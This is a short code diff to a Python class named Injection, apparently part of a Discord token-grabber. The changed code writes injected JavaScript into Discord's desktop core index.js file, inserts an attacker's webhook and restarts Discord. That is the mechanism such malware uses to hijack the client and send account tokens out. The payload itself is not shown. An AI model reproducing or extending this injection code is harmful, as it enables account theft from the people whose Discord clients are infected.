@@ -781,7 +781,7 @@ class Injection:
 
             if self.get_core(dir) is not None:
                 with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
-                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
+                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace(__CONFIG__['webhook'], webhook))
                     self.start_discord(dir)
 
     def get_core(self, dir: str):
